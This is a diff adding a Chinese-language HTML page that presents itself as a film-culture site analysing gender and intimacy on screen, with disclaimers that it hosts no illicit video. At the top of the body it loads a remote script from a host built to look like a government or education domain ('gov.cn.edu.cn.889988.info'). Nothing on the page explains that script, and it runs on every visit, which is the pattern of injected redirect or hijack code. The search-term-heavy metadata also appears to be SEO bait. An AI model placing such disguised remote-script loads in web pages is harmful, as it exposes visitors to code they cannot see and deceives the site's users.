@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#ffffff">
+<meta name="description" content="性影视（xingyingshi-top）把「性」作为影视研究的观察切口：梳理华语与海外影片中性别叙事的流变、亲密关系的镜头呈现方式、角色权力的构图安排，以及女性创作者的表达路径。在 https://xingyingshi-top.github.io 可读到影片札记、主题专题、镜头笔记与学术资料入口，内容仅作文化与影像讨论，不含违规影像资源。">
+<meta name="keywords" content="性影视, xingyingshi-top, 性别与影像, 电影中的性别叙事, 亲密关系镜头, 女性导演, 酷儿电影, 华语情欲片研究, 影视文化评论, 影像伦理">
+<title>性影视 xingyingshi-top｜性别叙事、影像表达与影视文化观察</title>
+<style>
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{margin:0;background:#fff;color:#1a1a1a;font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;font-size:15px;line-height:1.9}
+a{color:#1a1a1a;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 5vw}
+header{padding:26px 0 14px;border-bottom:1px solid #111}
+.hd{display:flex;align-items:center;justify-content:space-between;gap:18px;flex-wrap:wrap}
+.logo{font-size:22px;font-weight:700;letter-spacing:2px}
+.logo span{font-weight:400;font-size:13px;color:#777;margin-left:10px;letter-spacing:1px}
+.search{border:1px solid #bbb;padding:7px 12px;font-size:13px;width:min(240px,40vw)}
+nav{display:flex;gap:0;flex-wrap:wrap;margin-top:16px;border-top:1px solid #e5e5e5;padding-top:10px}
+nav a{padding:6px 18px 6px 0;font-size:14px;color:#444}
+nav a:hover{color:#c2185b}
+.hero{display:grid;grid-template-columns:2fr 1fr;gap:28px;padding:34px 0;border-bottom:1px solid #e5e5e5}
+.hero h1{font-size:clamp(26px,5.4vw,42px);margin:0 0 14px;line-height:1.35;font-weight:700;letter-spacing:1px}
+.hero h1 em{font-style:normal;color:#c2185b}
+.hero p{margin:0 0 12px;color:#444;font-size:15px}
+.hero .tag{display:inline-block;border:1px solid #c2185b;color:#c2185b;font-size:12px;padding:3px 10px;margin:0 6px 8px 0}
+.side{font-size:13px;color:#555}
+.side .box{border:1px solid #e5e5e5;padding:16px;margin-bottom:18px}
+.side .box h4{margin:0 0 10px;font-size:14px;border-left:3px solid #c2185b;padding-left:8px}
+.side .box p{margin:0 0 8px}
+section{padding:36px 0;border-bottom:1px solid #e5e5e5}
+.sec-head{display:flex;align-items:baseline;justify-content:space-between;gap:12px;margin-bottom:20px;flex-wrap:wrap}
+.sec-head h2{margin:0;font-size:20px;letter-spacing:1px}
+.sec-head h2 small{display:block;font-size:11px;color:#999;letter-spacing:2px;margin-top:4px;font-weight:400}
+.sec-head a{font-size:12px;color:#c2185b}
+.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.card{border:1px solid #e5e5e5;padding:18px}
+.card .cat{font-size:11px;color:#c2185b;letter-spacing:1px}
+.card h3{margin:8px 0 10px;font-size:17px}
+.card p{margin:0;font-size:13.5px;color:#555}
+.card .meta{margin-top:14px;font-size:12px;color:#999;border-top:1px dashed #e5e5e5;padding-top:10px}
+.timeline{position:relative;padding-left:26px}
+.timeline:before{content:"";position:absolute;left:6px;top:6px;bottom:6px;width:2px;background:#e5e5e5}
+.item{position:relative;padding:0 0 22px}
+.item:before{content:"";position:absolute;left:-24px;top:8px;width:9px;height:9px;background:#c2185b;border-radius:50%}
+.item .yr{font-size:12px;color:#c2185b;font-weight:700}
+.item h3{margin:4px 0 6px;font-size:16px}
+.item p{margin:0;font-size:13.5px;color:#555}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.grid2 h3{font-size:16px;margin:0 0 10px;border-left:3px solid #c2185b;padding-left:8px}
+.grid2 ul{margin:0;padding-left:20px;font-size:13.5px;color:#555}
+.grid2 li{margin-bottom:6px}
+.grid2 li b{color:#222}
+.notice{background:#fafafa;border-left:4px solid #c2185b;padding:16px 18px;font-size:13.5px;color:#555}
+.notice p{margin:0 0 8px}
+.notice p:last-child{margin:0}
+footer{border-top:2px solid #111;padding:28px 0 36px;font-size:12.5px;color:#777}
+.ft-links{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:14px}
+.ft-links a{color:#444}
+.ft-links a:hover{color:#c2185b}
+@media (max-width:860px){
+ .hero{grid-template-columns:1fr;gap:20px}
+ .cards{grid-template-columns:1fr 1fr}
+ .grid2{grid-template-columns:1fr}
+}
+@media (max-width:520px){
+ .wrap{padding:0 6vw}
+ .logo{font-size:19px}
+ .search{width:100%}
+ nav a{flex:1 1 50%;padding:6px 0}
+ .cards{grid-template-columns:1fr}
+ .hero h1{font-size:23px}
+ .sec-head h2{font-size:18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="wrap">
+
+<header>
+ <div class="hd">
+  <div class="logo">性影视<span>xingyingshi-top</span></div>
+  <input class="search" type="text" placeholder="检索影片札记 / 主题专题">
+ </div>
+ <nav aria-label="主导航">
+  <a href="#notes">影片札记</a>
+  <a href="#themes">主题专题</a>
+  <a href="#timeline">影像流变</a>
+  <a href="#reading">研究阅读</a>
+  <a href="#notice">内容说明</a>
+ </nav>
+</header>
+
+<section class="hero" style="border-bottom:none">
+ <div>
+  <h1>以<em>性</em>为切口，读影像里的<em>关系与权力</em></h1>
+  <p>性影视 xingyingshi-top 不讨论猎奇，而是把「性」放回影像的语言系统里：一段亲密关系如何被调度、一具身体如何被构图、一个角色的欲望如何被镜头允许或压抑。</p>
+  <p>本站收录影片札记、主题专题、影像流变年表与研究阅读清单，面向对性别与影像关系感兴趣的读者与研究者。</p>
+  <span class="tag">性别叙事</span>
+  <span class="tag">镜头语言</span>
+  <span class="tag">女性创作者</span>
+  <span class="tag">影视文化评论</span>
+ </div>
+ <aside class="side">
+  <div class="box">
+   <h4>关于本站</h4>
+   <p>性影视（xingyingshi-top）是一份影视文化观察笔记，内容限于影片文本、创作背景与学术讨论。</p>
+   <p>网址：<b style="color:#c2185b">https://xingyingshi-top.github.io</b></p>
+  </div>
+  <div class="box">
+   <h4>内容边界</h4>
+   <p>本站不提供任何影像资源的下载、播放或跳转链接，不收录违规内容，所有讨论均以公开上映或学术可引用的作品为对象。</p>
+  </div>
+ </aside>
+</section>
+
+<section id="notes">
+ <div class="sec-head">
+  <h2>影片札记<small>NOTES · 逐部拆解影像中的性别表达</small></h2>
+  <a href="#notes">全部札记</a>
+ </div>
+ <div class="cards">
+  <article class="card">
+   <div class="cat">华语 / 叙事结构</div>
+   <h3>身体、家庭与代际沉默</h3>
+   <p>以近十年华语家庭题材影片为样本，观察亲密场景如何服务于家庭权力结构的揭示，而非独立存在的情节点。</p>
+   <div class="meta">关键词：家庭伦理 · 身体叙事 · 长镜头</div>
+  </article>
+  <article class="card">
+   <div class="cat">海外 / 作者电影</div>
+   <h3>镜头距离与欲望的呈现</h3>
+   <p>比较不同导演处理亲密段落时的机位选择与剪辑节奏，讨论「观看距离」对观众代入感的决定作用。</p>
+   <div class="meta">关键词：机位 · 剪辑伦理 · 作者风格</div>
+  </article>
+  <article class="card">
+   <div class="cat">类型片 / 性别视角</div>
+   <h3>类型框架里的女性角色</h3>
+   <p>从悬疑、犯罪等类型片中辨认女性角色的功能性设定，并列举近年类型片对这一设定的松动方式。</p>
+   <div class="meta">关键词：类型叙事 · 角色功能 · 视角转换</div>
+  </article>
+  <article class="card">
+   <div class="cat">酷儿影像</div>
+   <h3>酷儿电影的叙事语法</h3>
+   <p>梳理酷儿题材影片在叙事结构、色彩使用与时间线上的独特选择，以及它们如何摆脱单一的身份展示。</p>
+   <div class="meta">关键词：酷儿 · 身份叙事 · 色彩语言</div>
+  </article>
+  <article class="card">
+   <div class="cat">女性导演</div>
+   <h3>女性创作者的视线</h3>
+   <p>以女性导演作品为对象，讨论她们对亲密关系的调度方式，与男性导演作品的差异是否真实存在。</p>
+   <div class="meta">关键词：女性导演 · 视线 · 表达路径</div>
+  </article>
+  <article class="card">
+   <div class="cat">方法 / 文本分析</div>
+   <h3>如何读一段亲密场景</h3>
+   <p>提供一个可复用的分析框架：光线、构图、机位、剪辑、声音五个层面，逐层读取场景的叙事意图。</p>
+   <div class="meta">关键词：分析方法 · 镜头五层 · 文本细读</div>
+  </article>
+ </div>
+</section>
+
+<section id="themes">
+ <div class="sec-head">
+  <h2>主题专题<small>THEMES · 围绕议题展开的比较阅读</small></h2>
+  <a href="#themes">展开全部</a>
+ </div>
+ <div class="grid2">
+  <div>
+   <h3>亲密关系的影像化</h3>
+   <ul>
+    <li><b>调度方式：</b>固定长拍、手持近距、景别跳跃对情绪强度的不同影响。</li>
+    <li><b>声音设计：</b>环境声、静默与音乐的取舍，如何改变场景的私密程度。</li>
+    <li><b>目光归属：</b>镜头究竟属于谁，决定了场景的权力落点。</li>
+   </ul>
+  </div>
+  <div>
+   <h3>性别与身体呈现</h3>
+   <ul>
+    <li><b>构图选择：</b>碎片化身体镜头与完整人物镜头的语义差别。</li>
+    <li><b>服装与空间：</b>道具与场景如何承担角色的性别身份标记。</li>
+    <li><b>观众位置：</b>观看位置的设定，牵涉影像伦理的基本问题。</li>
+   </ul>
+  </div>
+ </div>
+</section>
+
+<section id="timeline">
+ <div class="sec-head">
+  <h2>影像流变<small>CHRONOLOGY · 华语性别叙事的年代线索</small></h2>
+  <a href="#timeline">年表全文</a>
+ </div>
+ <div class="timeline">
+  <div class="item">
+   <div class="yr">1990 年代</div>
+   <h3>城市经验与私人空间的进入</h3>
+   <p>华语电影开始把私人情感与身体经验放进城市叙事，镜头语言从象征转向具体的生活细节。</p>
+  </div>
+  <div class="item">
+   <div class="yr">2000 年代</div>
+   <h3>作者表达与类型融合</h3>
+   <p>性别议题进入作者电影与商业类型的交汇地带，亲密段落开始承担叙事功能而非猎奇功能。</p>
+  </div>
+  <div class="item">
+   <div class="yr">2010 年代</div>
+   <h3>女性视线的自我确立</h3>
+   <p>更多女性创作者参与叙事，作品对亲密关系与身体的呈现出现明显的方法差异。</p>
+  </div>
+  <div class="item">
+   <div class="yr">2020 年代</div>
+   <h3>多元议题与公开讨论</h3>
+   <p>性别、身份与影像表达进入公开讨论空间，评论文本与影片文本形成相互参照。</p>
+  </div>
+ </div>
+</section>
+
+<section id="reading">
+ <div class="sec-head">
+  <h2>研究阅读<small>READING · 可继续深入的入口</small></h2>
+  <a href="#reading">阅读清单</a>
+ </div>
+ <div class="grid2">
+  <div>
+   <h3>研究方法</h3>
+   <ul>
+    <li><b>文本细读：</b>从单场戏的调度出发，不依赖剧情梗概。</li>
+    <li><b>横向比较：</b>同一议题在不同导演、不同年代作品中的呈现差异。</li>
+    <li><b>语境还原：</b>结合创作背景与上映语境，避免脱离时代的判断。</li>
+   </ul>
+  </div>
+  <div>
+   <h3>讨论边界</h3>
+   <ul>
+    <li><b>区分表达与宣扬：</b>影片呈现某类关系，不等于认同该关系。</li>
+    <li><b>尊重创作者意图：</b>分析时区分自觉选择与无意识呈现。</li>
+    <li><b>避免道德先行：</b>先读影像语言，再谈价值判断。</li>
+   </ul>
+  </div>
+ </div>
+</section>
+
+<section id="notice">
+ <div class="sec-head">
+  <h2>内容说明<small>NOTICE · 范围、边界与访问方式</small></h2>
+ </div>
+ <div class="notice">
+  <p><b>内容范围。</b>性影视（xingyingshi-top）的内容仅限影视作品的文本分析、创作背景介绍与性别研究视角的评论，属于影视文化讨论范畴。</p>
+  <p><b>资源边界。</b>本站不提供、不索引、不跳转任何影视资源的下载或播放渠道，不收录违规影像内容。如需观看影片，请通过合法的正版渠道。</p>
+  <p><b>学术取向。</b>文中涉及的作品以公开上映、公开发表或学术可引用的范围为限，引用遵循合理使用原则。</p>
+  <p><b>访问入口。</b>全部内容均发布于官方站点：<b style="color:#c2185b">https://xingyingshi-top.github.io</b>，建议收藏该地址。</p>
+ </div>
+</section>
+
+<footer>
+ <div class="ft-links">
+  <a href="#notes">影片札记</a>
+  <a href="#themes">主题专题</a>
+  <a href="#timeline">影像流变</a>
+  <a href="#reading">研究阅读</a>
+  <a href="#notice">内容说明</a>
+ </div>
+ <div>© <span id="yr">2026</span> 性影视 · xingyingshi-top　影视文化观察笔记</div>
+ <div style="margin-top:8px">官方网址：https://xingyingshi-top.github.io　内容仅供文化与学术研究参考，影片版权归各自权利人所有。</div>
+</footer>
+
+</div>
+<script>
+document.getElementById('yr').textContent=String(new Date().getFullYear());
+</script>
+</body>
+</html>
